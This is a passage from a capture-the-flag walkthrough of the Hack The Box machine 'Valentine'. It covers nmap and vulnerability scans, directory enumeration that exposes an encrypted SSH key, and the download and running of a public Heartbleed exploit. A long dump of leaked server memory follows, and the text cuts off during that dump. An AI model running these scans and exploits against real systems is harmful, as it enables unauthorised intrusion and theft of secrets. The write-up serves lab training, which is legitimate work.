#### Valentine

- [Attacker Info](#attacker-info)
- [Nmap Scan](#nmap-scan)
- [Web Enumeration](#web-enumeration)
- [SSH Enumeration](#ssh-enumeration)
- [Privilege Escalation](#privilege-escalation)
- [Gaining root](#gaining-root)
- [DirtyCow](#rirtycow)

###### Attacker Info

```sh
root@kali:~/valentine# ifconfig
eth0: flags=4163<UP,BROADCAST,RUNNING,MULTICAST>  mtu 1500
        inet 10.0.0.81  netmask 255.255.255.0  broadcast 10.0.0.255
        inet6 2601:5cc:c900:4024::ea8d  prefixlen 128  scopeid 0x0<global>
        inet6 fe80::20c:29ff:feb0:a919  prefixlen 64  scopeid 0x20<link>
        inet6 2601:5cc:c900:4024:181d:8bcf:3f1e:999  prefixlen 64  scopeid 0x0<global>
        inet6 2601:5cc:c900:4024:20c:29ff:feb0:a919  prefixlen 64  scopeid 0x0<global>
        ether 00:0c:29:b0:a9:19  txqueuelen 1000  (Ethernet)
        RX packets 287  bytes 40553 (39.6 KiB)
        RX errors 0  dropped 0  overruns 0  frame 0
        TX packets 172  bytes 22707 (22.1 KiB)
        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0

lo: flags=73<UP,LOOPBACK,RUNNING>  mtu 65536
        inet 127.0.0.1  netmask 255.0.0.0
        inet6 ::1  prefixlen 128  scopeid 0x10<host>
        loop  txqueuelen 1000  (Local Loopback)
        RX packets 24  bytes 1272 (1.2 KiB)
        RX errors 0  dropped 0  overruns 0  frame 0
        TX packets 24  bytes 1272 (1.2 KiB)
        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0

tun0: flags=4305<UP,POINTOPOINT,RUNNING,NOARP,MULTICAST>  mtu 1500
        inet 10.10.14.6  netmask 255.255.254.0  destination 10.10.14.6
        inet6 dead:beef:2::1004  prefixlen 64  scopeid 0x0<global>
        inet6 fe80::283c:d04:e925:8f5a  prefixlen 64  scopeid 0x20<link>
        unspec 00-00-00-00-00-00-00-00-00-00-00-00-00-00-00-00  txqueuelen 100  (UNSPEC)
        RX packets 0  bytes 0 (0.0 B)
        RX errors 0  dropped 0  overruns 0  frame 0
        TX packets 6  bytes 288 (288.0 B)
        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0

root@kali:~/valentine#
```

###### Nmap Scan

```sh
root@kali:~/valentine# nmap -sC -sV -oA valentine.nmap 10.10.10.79
Starting Nmap 7.70 ( https://nmap.org ) at 2018-11-04 12:11 EST
Nmap scan report for 10.10.10.79
Host is up (0.20s latency).
Not shown: 997 closed ports
PORT    STATE SERVICE  VERSION
22/tcp  open  ssh      OpenSSH 5.9p1 Debian 5ubuntu1.10 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   1024 96:4c:51:42:3c:ba:22:49:20:4d:3e:ec:90:cc:fd:0e (DSA)
|   2048 46:bf:1f:cc:92:4f:1d:a0:42:b3:d2:16:a8:58:31:33 (RSA)
|_  256 e6:2b:25:19:cb:7e:54:cb:0a:b9:ac:16:98:c6:7d:a9 (ECDSA)
80/tcp  open  http     Apache httpd 2.2.22 ((Ubuntu))
|_http-server-header: Apache/2.2.22 (Ubuntu)
|_http-title: Site doesn't have a title (text/html).
443/tcp open  ssl/http Apache httpd 2.2.22 ((Ubuntu))
|_http-server-header: Apache/2.2.22 (Ubuntu)
|_http-title: Site doesn't have a title (text/html).
| ssl-cert: Subject: commonName=valentine.htb/organizationName=valentine.htb/stateOrProvinceName=FL/countryName=US
| Not valid before: 2018-02-06T00:45:25
|_Not valid after:  2019-02-06T00:45:25
|_ssl-date: 2018-11-04T17:10:52+00:00; -59s from scanner time.
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Host script results:
|_clock-skew: mean: -59s, deviation: 0s, median: -59s

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 27.86 seconds
root@kali:~/valentine#
```

`Apache httpd 2.2.22 ubuntu`

![](images/1.png)

[`launchpad.net`](https://launchpad.net/ubuntu/+source/apache2/2.2.22-1ubuntu1.2)

![](images/2.png)

`ubuntu release precise`

![](images/3.png)

[`wiki.ubuntu.com`](https://wiki.ubuntu.com/Releases)

![](images/4.png)

```sh
root@kali:~/valentine# nmap --script vuln -oA vulnscan 10.10.10.79
Starting Nmap 7.70 ( https://nmap.org ) at 2018-11-04 12:19 EST
Pre-scan script results:
| broadcast-avahi-dos:
|   Discovered hosts:
|     224.0.0.251
|   After NULL UDP avahi packet DoS (CVE-2011-1002).
|_  Hosts are all up (not vulnerable).
Nmap scan report for 10.10.10.79
Host is up (0.22s latency).
Not shown: 997 closed ports
PORT    STATE SERVICE
22/tcp  open  ssh
80/tcp  open  http
|_http-csrf: Couldn't find any CSRF vulnerabilities.
|_http-dombased-xss: Couldn't find any DOM based XSS.
| http-enum:
|   /dev/: Potentially interesting directory w/ listing on 'apache/2.2.22 (ubuntu)'
|_  /index/: Potentially interesting folder
|_http-stored-xss: Couldn't find any stored XSS vulnerabilities.
|_http-vuln-cve2017-1001000: ERROR: Script execution failed (use -d to debug)
443/tcp open  https
|_http-csrf: Couldn't find any CSRF vulnerabilities.
|_http-dombased-xss: Couldn't find any DOM based XSS.
| http-enum:
|   /dev/: Potentially interesting directory w/ listing on 'apache/2.2.22 (ubuntu)'
|_  /index/: Potentially interesting folder
|_http-stored-xss: Couldn't find any stored XSS vulnerabilities.
|_http-vuln-cve2017-1001000: ERROR: Script execution failed (use -d to debug)
| ssl-ccs-injection:
|   VULNERABLE:
|   SSL/TLS MITM vulnerability (CCS Injection)
|     State: VULNERABLE
|     Risk factor: High
|       OpenSSL before 0.9.8za, 1.0.0 before 1.0.0m, and 1.0.1 before 1.0.1h
|       does not properly restrict processing of ChangeCipherSpec messages,
|       which allows man-in-the-middle attackers to trigger use of a zero
|       length master key in certain OpenSSL-to-OpenSSL communications, and
|       consequently hijack sessions or obtain sensitive information, via
|       a crafted TLS handshake, aka the "CCS Injection" vulnerability.
|
|     References:
|       https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2014-0224
|       http://www.openssl.org/news/secadv_20140605.txt
|_      http://www.cvedetails.com/cve/2014-0224
| ssl-heartbleed:
|   VULNERABLE:
|   The Heartbleed Bug is a serious vulnerability in the popular OpenSSL cryptographic software library. It allows for stealing information intended to be protected by SSL/TLS encryption.
|     State: VULNERABLE
|     Risk factor: High
|       OpenSSL versions 1.0.1 and 1.0.2-beta releases (including 1.0.1f and 1.0.2-beta1) of OpenSSL are affected by the Heartbleed bug. The bug allows for reading memory of systems protected by the vulnerable OpenSSL versions and could allow for disclosure of otherwise encrypted confidential information as well as the encryption keys themselves.
|
|     References:
|       http://www.openssl.org/news/secadv_20140407.txt
|       http://cvedetails.com/cve/2014-0160/
|_      https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2014-0160
| ssl-poodle:
|   VULNERABLE:
|   SSL POODLE information leak
|     State: VULNERABLE
|     IDs:  OSVDB:113251  CVE:CVE-2014-3566
|           The SSL protocol 3.0, as used in OpenSSL through 1.0.1i and other
|           products, uses nondeterministic CBC padding, which makes it easier
|           for man-in-the-middle attackers to obtain cleartext data via a
|           padding-oracle attack, aka the "POODLE" issue.
|     Disclosure date: 2014-10-14
|     Check results:
|       TLS_RSA_WITH_AES_128_CBC_SHA
|     References:
|       http://osvdb.org/113251
|       https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2014-3566
|       https://www.imperialviolet.org/2014/10/14/poodle.html
|_      https://www.openssl.org/~bodo/ssl-poodle.pdf
|_sslv2-drown:

Nmap done: 1 IP address (1 host up) scanned in 68.03 seconds
root@kali:~/valentine#
```

###### Web Enumeration

```
http://10.10.10.79/
```

![](images/5.png)

```sh
root@kali:~/valentine# gobuster -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -t 50 -u http://10.10.10.79

Gobuster v1.4.1              OJ Reeves (@TheColonial)
=====================================================
=====================================================
[+] Mode         : dir
[+] Url/Domain   : http://10.10.10.79/
[+] Threads      : 50
[+] Wordlist     : /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
[+] Status codes : 307,200,204,301,302
=====================================================
/index (Status: 200)
/dev (Status: 301)
/encode (Status: 200)
/decode (Status: 200)
/omg (Status: 200)
=====================================================
root@kali:~/valentine#
```

```
http://10.10.10.79/dev/
http://10.10.10.79/dev/notes.txt
http://10.10.10.79/dev/hype_key
```

![](images/6.png)

![](images/7.png)

![](images/8.png)

[`Hex to ASCII`](https://www.rapidtables.com/convert/number/hex-to-ascii.html)

![](images/9.png)

```sh
root@kali:~/valentine# cat hype.key
-----BEGIN RSA PRIVATE KEY-----
Proc-Type: 4,ENCRYPTED
DEK-Info: AES-128-CBC,AEB88C140F69BF2074788DE24AE48D46

DbPrO78kegNuk1DAqlAN5jbjXv0PPsog3jdbMFS8iE9p3UOL0lF0xf7PzmrkDa8R
5y/b46+9nEpCMfTPhNuJRcW2U2gJcOFH+9RJDBC5UJMUS1/gjB/7/My00Mwx+aI6
0EI0SbOYUAV1W4EV7m96QsZjrwJvnjVafm6VsKaTPBHpugcASvMqz76W6abRZeXi
Ebw66hjFmAu4AzqcM/kigNRFPYuNiXrXs1w/deLCqCJ+Ea1T8zlas6fcmhM8A+8P
OXBKNe6l17hKaT6wFnp5eXOaUIHvHnvO6ScHVWRrZ70fcpcpimL1w13Tgdd2AiGd
pHLJpYUII5PuO6x+LS8n1r/GWMqSOEimNRD1j/59/4u3ROrTCKeo9DsTRqs2k1SH
QdWwFwaXbYyT1uxAMSl5Hq9OD5HJ8G0R6JI5RvCNUQjwx0FITjjMjnLIpxjvfq+E
p0gD0UcylKm6rCZqacwnSddHW8W3LxJmCxdxW5lt5dPjAkBYRUnl91ESCiD4Z+uC
Ol6jLFD2kaOLfuyee0fYCb7GTqOe7EmMB3fGIwSdW8OC8NWTkwpjc0ELblUa6ulO
t9grSosRTCsZd14OPts4bLspKxMMOsgnKloXvnlPOSwSpWy9Wp6y8XX8+F40rxl5
XqhDUBhyk1C3YPOiDuPOnMXaIpe1dgb0NdD1M9ZQSNULw1DHCGPP4JSSxX7BWdDK
aAnWJvFglA4oFBBVA8uAPMfV2XFQnjwUT5bPLC65tFstoRtTZ1uSruai27kxTnLQ
+wQ87lMadds1GQNeGsKSf8R/rsRKeeKcilDePCjeaLqtqxnhNoFtg0Mxt6r2gb1E
AloQ6jg5Tbj5J7quYXZPylBljNp9GVpinPc3KpHttvgbptfiWEEsZYn5yZPhUr9Q
r08pkOxArXE2dj7eX+bq65635OJ6TqHbAlTQ1Rs9PulrS7K4SLX7nY89/RZ5oSQe
2VWRyTZ1FfngJSsv9+Mfvz341lbzOIWmk7WfEcWcHc16n9V0IbSNALnjThvEcPky
e1BsfSbsf9FguUZkgHAnnfRKkGVG1OVyuwc/LVjmbhZzKwLhaZRNd8HEM86fNojP
09nVjTaYtWUXk0Si1W02wbu1NzL+1Tg9IpNyISFCFYjSqiyG+WU7IwK3YU5kp3CC
dYScz63Q2pQafxfSbuv4CMnNpdirVKEo5nRRfK/iaL3X1R3DxV8eSYFKFL6pqpuX
cY5YZJGAp+JxsnIQ9CFyxIt92frXznsjhlYa8svbVNNfk/9fyX6op24rL2DyESpY
pnsukBCFBkZHWNNyeN7b5GhTVCodHhzHVFehTuBrp+VuPqaqDvMCVe1DZCb4MjAj
Mslf+9xK+TXEL3icmIOBRdPyw6e/JlQlVRlmShFpI8eb/8VsTyJSe+b853zuV2qL
suLaBMxYKm3+zEDIDveKPNaaWZgEcqxylCC/wUyUXlMJ50Nw6JNVMM8LeCii3OEW
l0ln9L1b/NXpHjGa8WHHTjoIilB5qNUyywSeTBF2awRlXH9BrkZG4Fc4gdmW/IzT
RUgZkbMQZNIIfzj1QuilRVBm/F76Y/YMrmnM9k/1xSGIskwCUQ+95CGHJE8MkhD3
-----END RSA PRIVATE KEY-----
root@kali:~/valentine#
root@kali:~/valentine# file hype.key
hype.key: PEM RSA private key
root@kali:~/valentine# chmod 600 hype.key
```

- [`Heartbleed`](https://xkcd.com/1354/)

```sh
root@kali:~/valentine# sslyze --heartbleed 10.10.10.79:443



 AVAILABLE PLUGINS
 -----------------

  PluginSessionResumption
  PluginSessionRenegotiation
  PluginCompression
  PluginChromeSha1Deprecation
  PluginOpenSSLCipherSuites
  PluginCertInfo
  PluginHSTS
  PluginHeartbleed



 CHECKING HOST(S) AVAILABILITY
 -----------------------------

   10.10.10.79:443                     => 10.10.10.79:443



 SCAN RESULTS FOR 10.10.10.79:443 - 10.10.10.79:443
 --------------------------------------------------

  * OpenSSL Heartbleed:
      VULNERABLE - Server is vulnerable to Heartbleed



 SCAN COMPLETED IN 1.02 S
 ------------------------
root@kali:~/valentine#
```

[`heartbleed.py`](https://gist.github.com/eelsivart/10174134)

```sh
root@kali:~/valentine# wget https://gist.githubusercontent.com/eelsivart/10174134/raw/8aea10b2f0f6842ccff97ee921a836cf05cd7530/heartbleed.py
--2018-11-04 12:41:55--  https://gist.githubusercontent.com/eelsivart/10174134/raw/8aea10b2f0f6842ccff97ee921a836cf05cd7530/heartbleed.py
Resolving gist.githubusercontent.com (gist.githubusercontent.com)... 151.101.248.133
Connecting to gist.githubusercontent.com (gist.githubusercontent.com)|151.101.248.133|:443... connected.
HTTP request sent, awaiting response... 200 OK
Length: 18230 (18K) [text/plain]
Saving to: ‘heartbleed.py’

heartbleed.py                                      100%[================================================================================================================>]  17.80K  --.-KB/s    in 0.02s

2018-11-04 12:41:56 (980 KB/s) - ‘heartbleed.py’ saved [18230/18230]

root@kali:~/valentine#
```

```sh
root@kali:~/valentine# python heartbleed.py

defribulator v1.16
A tool to test and exploit the TLS heartbeat vulnerability aka heartbleed (CVE-2014-0160)
Usage: heartbleed.py server [options]

Test and exploit TLS heartbeat vulnerability aka heartbleed (CVE-2014-0160)

Options:
  -h, --help            show this help message and exit
  -p PORT, --port=PORT  TCP port to test (default: 443)
  -n NUM, --num=NUM     Number of times to connect/loop (default: 1)
  -s, --starttls        Issue STARTTLS command for SMTP/POP/IMAP/FTP/etc...
  -f FILEIN, --filein=FILEIN
                        Specify input file, line delimited, IPs or hostnames
                        or IP:port or hostname:port
  -v, --verbose         Enable verbose output
  -x, --hexdump         Enable hex output
  -r RAWOUTFILE, --rawoutfile=RAWOUTFILE
                        Dump the raw memory contents to a file
  -a ASCIIOUTFILE, --asciioutfile=ASCIIOUTFILE
                        Dump the ascii contents to a file
  -d, --donotdisplay    Do not display returned data on screen
  -e, --extractkey      Attempt to extract RSA Private Key, will exit when
                        found. Choosing this enables -d, do not display
                        returned data on screen.
root@kali:~/valentine#
```

```
# Payload
0x01,       # Type (Request)
0x10, 0x00  # Payload length
    ]
    return heartbeat
```

![](images/10.png)

```sh
root@kali:~/valentine# python heartbleed.py 10.10.10.79 -n 100

defribulator v1.16
A tool to test and exploit the TLS heartbeat vulnerability aka heartbleed (CVE-2014-0160)

##################################################################
Connecting to: 10.10.10.79:443, 100 times
Sending Client Hello for TLSv1.0
Received Server Hello for TLSv1.0

WARNING: 10.10.10.79:443 returned more data than it should - server is vulnerable!
Please wait... connection attempt 100 of 100
##################################################################

......SC[...r....+..H...9...
....w.3....f...
...!.9.8.........5...............
.........3.2.....E.D...../...A.................................I.........
...........
.(V.>T..2........SC[...r....+..H...9....
....w.3....f...
...!.9.8.........5...............
.........3.2.....E.D...../...A.................................I.........
...........
...................................#*.\.WB.I......k.......SC[...r....+..H...9...
....w.3....f...
...!.9.8.........5...............
.........3.2.....E.D...../...A.................................I.........
...........
...................................#W..S......^:..>.......SC[...r....+..H...9...
....w.3....f...
...!.9.8.........5...............
.........3.2.....E.D...../...A.................................I.........
...........
...................................#.......0.0.1/decode.php
Content-Type: application/x-www-form-urlencoded
Content-Length: 42

$text=aGVhcnRibGVlZGJlbGlldmV0aGVoeXBlCg==x.UQ.......j..|.U&Er.F....7..X&......SC[...r....+..H...9...
....w.3....f...
...!.9.8.........5...............
.........3.2.....E.D...../...A.................................I.........
...........
...................................#.......0.0.1/decode.php
Content-Type: application/x-www-form-urlencoded
Content-Length: 42

$text=aGVhcnRibGVlZGJlbGlldmV0aGVoeXBlCg==J...._..._..<X..6A..^.J.&.]...w......SC[...r....+..H...9...
....w.3....f...
...!.9.8.........5...............
.........3.2.....E.D...../...A.................................I.........
...........
...................................#C....`.QQ I.GoV......SC[...r....+..H...9...
....w.3....f...
...!.9.8.........5...............
.........3.2.....E.D...../...A.................................I.........
...........
...................................#wN....."..*xs........SC[...r....+..H...9...
....w.3....f...
...!.9.8.........5...............
.........3.2.....E.D...../...A.................................I.........
...........
...................................#p.
20.....A8-......SC[...r....+..H...9...
....w.3....f...
...!.9.8.........5...............
.........3.2.....E.D...../...A.................................I.........
...........
...................................#.......0.0.1/decode.php
Content-Type: application/x-www-form-urlencoded
Content-Length: 42

$text=aGVhcnRibGVlZGJlbGlldmV0aGVoeXBlCg==.L...).$...a.......Sh.'-.kS.*0........SC[...r....+..H...9...
....w.3....f...
...!.9.8.........5...............
.........3.2.....E.D...../...A.................................I.........
...........
...................................#.......0.0.1/decode.php
Content-Type: application/x-www-form-urlencoded
Content-Length: 42

$text=aGVhcnRibGVlZGJlbGlldmV0aGVoeXBlCg==..A.d.)3+......N\...P."C..........SC[...r....+..H...9...
....w.3....f...
...!.9.8.........5...............
.........3.2.....E.D...../...A.................................I.........
...........
...................................#$7.....44;.Xh.>......SC[...r....+..H...9...
....w.3....f...
...!.9.8.........5...............
.........3.2.....E.D...../...A.................................I.........
...........
...................................#9z.$...~a...f......SC[...r....+..H...9...
....w.3....f...
...!.9.8.........5...............
.........3.2.....E.D...../...A.................................I.........
...........
..a..R........SC[...r....+..H...9...D)...\z
....w.3....f...
...!.9.8.........5...............
.........3.2.....E.D...../...A.................................I.........
...........
...................................#.......0.0.1/decode.php
Content-Type: application/x-www-form-urlencoded
Content-Length: 42

$text=aGVhcnRibGVlZGJlbGlldmV0aGVoeXBlCg==x.UQ.......j..|.U&E#.]a.Eo...A......SC[...r....+..H...9...
....w.3....f...
...!.9.8.........5...............
.........3.2.....E.D...../...A.................................I.........
...........
...................................#.......0.0.1/decode.php
Content-Type: application/x-www-form-urlencoded
Content-Length: 42

$text=aGVhcnRibGVlZGJlbGlldmV0aGVoeXBlCg==J...._..._..<X..6q....F..8.R........SC[...r....+..H...9...
....w.3....f...
...!.9.8.........5...............
.........3.2.....E.D...../...A.................................I.........
...........
...................................#O...+]..Y=........SC[...r....+..H...9...
....w.3....f...
...!.9.8.........5...............
.........3.2.....E.D...../...A.................................I.........
...........
...................................#t.o...}....Y^+.......SC[...r....+..H...9...
....w.3....f...
...!.9.8.........5...............
.........3.2.....E.D...../...A.................................I.........
...........
...................................#X.>z.....N.N.#......SC[...r....+..H...9...
....w.3....f...
...!.9.8.........5...............
.........3.2.....E.D...../...A.................................I.........
...........
...................................#.......0.0.1/decode.php
Content-Type: application/x-www-form-urlencoded
Content-Length: 42

$text=aGVhcnRibGVlZGJlbGlldmV0aGVoeXBlCg==.L...).$...a.......S4.$.@.`YJs...jF......SC[...r....+..H...9...
....w.3....f...
...!.9.8.........5...............
.........3.2.....E.D...../...A.................................I.........
...........
...................................#.......0.0.1/decode.php
Content-Type: application/x-www-form-urlencoded
Content-Length: 42

$text=aGVhcnRibGVlZGJlbGlldmV0aGVoeXBlCg==..A.d.)3+......N\.%.)AV.X_...if......SC[...r....+..H...9...
....w.3....f...
...!.9.8.........5...............
.........3.2.....E.D...../...A.................................I.........
...........
...................................#I.A.J....l.._w.......SC[...r....+..H...9...
....w.3....f...
...!.9.8.........5...............
.........3.2.....E.D...../...A.................................I.........
...........
...................................#k.h..................SC[...r....+..H...9...
....w.3....f...
...!.9.8.........5...............
.........3.2.....E.D...../...A.................................I.........
...........
...................................#M..+.[N.M.../,.......SC[...r....+..H...9...
....w.3....f...
...!.9.8.........5...............
.........3.2.....E.D...../...A.................................I.........
...........
...................................#.......0.0.1/decode.php
Content-Type: application/x-www-form-urlencoded
Content-Length: 42

$text=aGVhcnRibGVlZGJlbGlldmV0aGVoeXBlCg==x.UQ.......j..|.U&ER...Ti#;<.sc.......SC[...r....+..H...9...
....w.3....f...
...!.9.8.........5...............
.........3.2.....E.D...../...A.................................I.........
...........
...................................#.......0.0.1/decode.php
Content-Type: application/x-www-form-urlencoded
Content-Length: 42

$text=aGVhcnRibGVlZGJlbGlldmV0aGVoeXBlCg==J...._..._..<X..6S]0..{$f.......SC[...r....+..H...9...
....w.3....f...
...!.9.8.........5...............
.........3.2.....E.D...../...A.................................I.........
...........
...v......SC[...r....+..H...9......#X....t....N
....w.3....f...
...!.9.8.........5...............
.........3.2.....E.D...../...A.................................I.........
...........
...................................#j.UK6..)[M:.bO.......SC[...r....+..H...9...
....w.3....f...
...!.9.8.........5...............
.........3.2.....E.D...../...A.................................I.........
...........
...................................# ....=&...qD.|......SC[...r....+..H...9...
....w.3....f...
...!.9.8.........5...............
.........3.2.....E.D...../...A.................................I.........
...........
...................................#.......0.0.1/decode.php
Content-Type: application/x-www-form-urlencoded
Content-Length: 42

$text=aGVhcnRibGVlZGJlbGlldmV0aGVoeXBlCg==.L...).$...a.......Sq......R..f4..2......SC[...r....+..H...9...
....w.3....f...
...!.9.8.........5...............
.........3.2.....E.D...../...A.................................I.........
...........
...................................#.......0.0.1/decode.php
Content-Type: application/x-www-form-urlencoded
Content-Length: 42

$text=aGVhcnRibGVlZGJlbGlldmV0aGVoeXBlCg==..A.d.)3+......Nee+........V.c.K......SC[...r....+..H...9...
....w.3....f...
...!.9.8.........5...............
.........3.2.....E.D...../...A.................................I.........
...........
...................................#$..`..O.|.............SC[...r....+..H...9...
....w.3....f...
...!.9.8.........5...............
.........3.2.....E.D...../...A.................................I.........
...........
...................................#1`.hc.<.....=_........SC[...r....+..H...9...
....w.3....f...
...!.9.8.........5...............
.........3.2.....E.D...../...A.................................I.........
...........
...................................#'.<..E$.......SC[...r....+..H...9...
....w.3....f...
...!.9.8.........5...............
.........3.2.....E.D...../...A.................................I.........
...........
...................................#.......0.0.1/decode.php
Content-Type: application/x-www-form-urlencoded
Content-Length: 42

$text=aGVhcnRibGVlZGJlbGlldmV0aGVoeXBlCg==x.UQ.......j..|.U&Ed.*..I................SC[...r....+..H...9...
....w.3....f...
...!.9.8.........5...............
.........3.2.....E.D...../...A.................................I.........
...........
...................................#.......0.0.1/decode.php
Content-Type: application/x-www-form-urlencoded
Content-Length: 42

$text=aGVhcnRibGVlZGJlbGlldmV0aGVoeXBlCg==J...._..._..<X..6i%R~<c8
P.......SC[...r....+..H...9...
....w.3....f...
...!.9.8.........5...............
.........3.2.....E.D...../...A.................................I.........
...........
...................................#9.....3xHm..<$7......SC[...r....+..H...9...
....w.3....f...
...!.9.8.........5...............
.........3.2.....E.D...../...A.................................I.........
...........
...................................#CP(6.!........E......SC[...r....+..H...9...
....w.3....f...
...!.9.8.........5...............
.........3.2.....E.D...../...A.................................I.........
...........
...................................#\w.....Z(;s..N......SC[...r....+..H...9...
....w.3....f...
...!.9.8.........5...............
.........3.2.....E.D...../...A.................................I.........
...........
...................................#.......0.0.1/decode.php
Content-Type: application/x-www-form-urlencoded
Content-Length: 42

.......SC[...r....+..H...9...0aGVoeXBlCg==.L...).$...a.......SaN.....k.J}.XE
....w.3....f...
...!.9.8.........5...............
.........3.2.....E.D...../...A.................................I.........
...........
...................................#.......0.0.1/decode.php
Content-Type: application/x-www-form-urlencoded
Content-Length: 42

$text=aGVhcnRibGVlZGJlbGlldmV0aGVoeXBlCg==..A.d.)3+......Ne......f.|Z......SC[...r....+..H...9...
....w.3....f...
...!.9.8.........5...............
.........3.2.....E.D...../...A.................................I.........
...........
...................................##.`.b!g.SC..C.:.......SC[...r....+..H...9...
....w.3....f...
...!.9.8.........5...............
.........3.2.....E.D...../...A.................................I.........
...........
...................................#|....?......SC[...r....+..H...9...
....w.3....f...
...!.9.8.........5...............
.........3.2.....E.D...../...A.................................I.........
...........
...................................#).1.......e{..........SC[...r....+..H...9...
....w.3....f...
...!.9.8.........5...............
.........3.2.....E.D...../...A.................................I.........
...........
...................................#.......0.0.1/decode.php
Content-Type: application/x-www-form-urlencoded
Content-Length: 42

$text=aGVhcnRibGVlZGJlbGlldmV0aGVoeXBlCg==x.UQ.......j..|.U&E_2..GA}*C....?0.......SC[...r....+..H...9...
....w.3....f...
...!.9.8.........5...............
.........3.2.....E.D...../...A.................................I.........
...........
...................................#.......0.0.1/decode.php
Content-Type: application/x-www-form-urlencoded
Content-Length: 42

$text=aGVhcnRibGVlZGJlbGlldmV0aGVoeXBlCg==J...._..._..<X..6|1N...\.C%..0.........SC[...r....+..H...9...
....w.3....f...
...!.9.8.........5...............
.........3.2.....E.D...../...A.................................I.........
...........
...................................#f7..7O..Be.......SC[...r....+..H...9...
....w.3....f...
...!.9.8.........5...............
.........3.2.....E.D...../...A.................................I.........
...........
...................................#ZK...a%.v..f.........SC[...r....+..H...9...
....w.3....f...
...!.9.8.........5...............
.........3.2.....E.D...../...A.................................I.........
...........
...................................#&...V....W..\Q......SC[...r....+..H...9...
....w.3....f...
...!.9.8.........5...............
.........3.2.....E.D...../...A.................................I.........
...........
...................................#.......0.0.1/decode.php
Content-Type: application/x-www-form-urlencoded
Content-Length: 42

$text=aGVhcnRibGVlZGJlbGlldmV0aGVoeXBlCg==.L...).$...a.......Se.;....).............SC[...r....+..H...9...
....w.3....f...
...!.9.8.........5...............
.........3.2.....E.D...../...A.................................I.........
...........
...................................#.......0.0.1/decode.php
Content-Type: application/x-www-form-urlencoded
Content-Length: 42

$text=aGVhcnRibGVlZGJlbGlldmV0aGVoeXBlCg==..A.d.)3+......Nd.....?.k...."V.......SC[...r....+..H...9...
....w.3....f...
...!.9.8.........5...............
.........3.2.....E.D...../...A.................................I.........
...........
...................................#P..l..J.X......SC[...r....+..H...9...
....w.3....f...
...!.9.8.........5...............
.........3.2.....E.D...../...A.................................I.........
...........
...................................#&^8WH4.......(........SC[...r....+..H...9...
....w.3....f...
...!.9.8.........5...............
.........3.2.....E.D...../...A.................................I.........
...........
...................................#`.h.-.....lu.........SC[...r....+..H...9...
....w.3....f...
...!.9.8.........5...............
.........3.2.....E.D...../...A.................................I.........
...........
...................................#.......0.0.1/decode.php
Content-Type: application/x-www-form-urlencoded
Content-Length: 42

$text=aGVhcnRibGVlZGJlbGlldmV0aGVoeXBlCg==x.UQ.......j..|.U&EdV.~.....$ym)<......SC[...r....+..H...9...
....w.3....f...
...!.9.8.........5...............
.........3.2.....E.D...../...A.................................I.........
...........
...................................#.......0.0.1/decode.php
Content-Type: application/x-www-form-urlencoded
Content-Length: 42

$text=aGVhcnRibGVlZGJlbGlldmV0aGVoeXBlCg==J...._..._..<X..6p.......v.I..4........SC[...r....+..H...9...
....w.3....f...
...!.9.8.........5...............
.........3.2.....E.D...../...A.................................I.........
...........
...................................#f2....^S.}O..5e.......SC[...r....+..H...9...
....w.3....f...
...!.9.8.........5...............
.........3.2.....E.D...../...A.................................I.........
...........
...................................#q..c.O..K.......SC[...r....+..H...9...
....w.3....f...
...!.9.8.........5...............
.........3.2.....E.D...../...A.................................I.........
...........
...................................#0.....c.&{.vhn......SC[...r....+..H...9...
....w.3....f...
...!.9.8.........5...............
.........3.2.....E.D...../...A.................................I.........
...........
...................................#.......0.0.1/decode.php
Content-Type: application/x-www-form-urlencoded
Content-Length: 42

.*.s[.F......SC[...r....+..H...9...XBlCg==.L...).$...a.......SR.?...m.
....w.3....f...
...!.9.8.........5...............
.........3.2.....E.D...../...A.................................I.........
...........
...................................#.......0.0.1/decode.php
Content-Type: application/x-www-form-urlencoded
Content-Length: 42

9.........SC[...r....+..H...9...VoeXBlCg==..A.d.)3+......NI...5).$...
....w.3....f...
...!.9.8.........5...............
.........3.2.....E.D...../...A.................................I.........
...........
..........t......SC[...r....+..H...9...
....w.3....f...
...!.9.8.........5...............
.........3.2.....E.D...../...A.................................I.........
...........
...................................#$h.[.%...wb)..5.......SC[...r....+..H...9...
....w.3....f...
...!.9.8.........5...............
.........3.2.....E.D...../...A.................................I.........
...........
...................................#9.~........S..D......SC[...r....+..H...9...
....w.3....f...
...!.9.8.........5...............
.........3.2.....E.D...../...A.................................I.........
...........
...................................#.......0.0.1/decode.php
Content-Type: application/x-www-form-urlencoded
Content-Length: 42

$text=aGVhcnRibGVlZGJlbGlldmV0aGVoeXBlCg==x.UQ.......j..|.U&Er{.."_...b.P.......SC[...r....+..H...9...
....w.3....f...
...!.9.8.........5...............
.........3.2.....E.D...../...A.................................I.........
...........
...................................#.......0.0.1/decode.php
Content-Type: application/x-www-form-urlencoded
Content-Length: 42

$text=aGVhcnRibGVlZGJlbGlldmV0aGVoeXBlCg==J...._..._..<X..6id.......}.S.}......SC[...r....+..H...9...
....w.3....f...
...!.9.8.........5...............
.........3.2.....E.D...../...A.................................I.........
...........
...................................#eC.Ly.O .";q.........SC[...r....+..H...9...
....w.3....f...
...!.9.8.........5...............
.........3.2.....E.D...../...A.................................I.........
...........
...................................#0s^.....l...........SC[...r....+..H...9...
....w.3....f...
...!.9.8.........5...............
.........3.2.....E.D...../...A.................................I.........
...........
...................................#F.t. ..+...aZn......SC[...r....+..H...9...
....w.3....f...
...!.9.8.........5...............
.........3.2.....E.D...../...A.................................I.........
...........
...................................#.......0.0.1/decode.php
Content-Type: application/x-www-form-urlencoded
Content-Length: 42

$text=aGVhcnRibGVlZGJlbGlldmV0aGVoeXBlCg==.L...).$...a.......SU{...;..Y_xn..........SC[...r....+..H...9...
....w.3....f...
...!.9.8.........5...............
.........3.2.....E.D...../...A.................................I.........
...........
...................................#.......0.0.1/decode.php
Content-Type: application/x-www-form-urlencoded
Content-Length: 42

